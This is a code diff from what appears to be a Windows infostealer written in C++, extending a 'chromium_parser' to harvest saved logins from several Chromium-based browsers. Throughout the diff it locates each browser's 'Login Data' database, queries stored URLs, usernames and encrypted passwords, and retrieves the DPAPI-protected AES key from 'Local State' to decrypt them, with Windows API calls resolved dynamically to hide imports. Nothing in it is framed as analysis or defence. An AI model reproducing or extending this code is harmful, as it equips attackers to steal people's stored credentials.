@@ -8,22 +8,32 @@
 
 List<AccountData> chromium_parser::collect_data()
 {
+	for(const auto& browser : m_chromium_list)
+	{
+		try_collect(browser);	}
+
+	return m_collected_data;
+}
+
+void chromium_parser::try_collect(const String& chromium_path)
+{
+
 	List<AccountData> out_data;
-	if (!get_path_to_db()) return out_data;
+	if (!get_path_to_db(chromium_path)) return;
 
 	sqlite3* db;
 
 	if (sqlite3_open(m_chrome_sqlite_path.c_str(), &db) != SQLITE_OK)
-		return out_data;
+		return;
 
 
 	sqlite3_stmt* stmt;
 	if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0) != SQLITE_OK)
-		return out_data;
+		return;
 
 	int entries = 0;
 
-	if (!get_decryption_key()) return out_data;
+	if (!get_decryption_key(chromium_path)) return;
 
 	while (sqlite3_step(stmt) == SQLITE_ROW)
 	{
@@ -93,13 +103,14 @@ List<AccountData> chromium_parser::collect_data()
 		entries++;
 	}
 
-	return out_data;
-	
+	for(const auto& item:  out_data)
+	{
+		m_collected_data.emplace_back(std::move(item));
+	}
 }
 
 
-
-bool chromium_parser::get_path_to_db()
+bool chromium_parser::get_path_to_db(const String& chromium_path)
 {
 	const auto get_user_path = WinApiImport<f_SHGetFolderPathA>::get_func("SHGetFolderPathA", "shell32.dll");
 
@@ -110,16 +121,16 @@ bool chromium_parser::get_path_to_db()
 	char _path[MAX_PATH];
 	if(get_user_path(NULL, local_data_app, NULL, 0, _path) != S_OK) return false;
 	m_chrome_sqlite_path = _path;
-	m_chrome_sqlite_path += m_chromium_base_path+R"(\User Data\Default\Login Data)";
+	m_chrome_sqlite_path += chromium_path +R"(\User Data\Default\Login Data)";
 	return true;	
 }
 
-bool chromium_parser::get_decryption_key()
+bool chromium_parser::get_decryption_key(const String& chromium_path)
 {
 
 	std::string keyBase64;
 	DWORD keySize = 0;
-	if (!get_chrome_key(keyBase64, keySize))
+	if (!get_chrome_key(keyBase64, keySize, chromium_path))
 	{
 		return false;
 	}
@@ -144,7 +155,7 @@ bool chromium_parser::get_decryption_key()
 	return true;
 }
 
-bool chromium_parser::get_chrome_key(std::string& key, unsigned long& keySize)
+bool chromium_parser::get_chrome_key(std::string& key, unsigned long& keySize, const String& chromium_path)
 {
 
 	HANDLE hFile = INVALID_HANDLE_VALUE;
@@ -154,7 +165,7 @@ bool chromium_parser::get_chrome_key(std::string& key, unsigned long& keySize)
 
 	String chrome_path;
 
-	if (!get_key_path(chrome_path))
+	if (!get_key_path(chrome_path, chromium_path))
 	{
 		return FALSE;
 	}
@@ -214,7 +225,7 @@ bool chromium_parser::get_chrome_key(std::string& key, unsigned long& keySize)
 	return true;
 }
 
-bool chromium_parser::get_key_path(String& keyPath)
+bool chromium_parser::get_key_path(String& keyPath,const String& chromium_path)
 {
 	const auto get_path = WinApiImport<f_SHGetFolderPathA>::get_func("SHGetFolderPathA", "shell32.dll");
 	//получаем путь до AppData
@@ -225,7 +236,7 @@ bool chromium_parser::get_key_path(String& keyPath)
 	{
 		//файл Local State содержит зашифрованный ключ для AES256-GCM (base64+DPAPI)
 		keyPath = path;
-		keyPath += m_chromium_base_path+R"(\User Data\Local State)";
+		keyPath += chromium_path +R"(\User Data\Local State)";
 
 		return true;
 	}
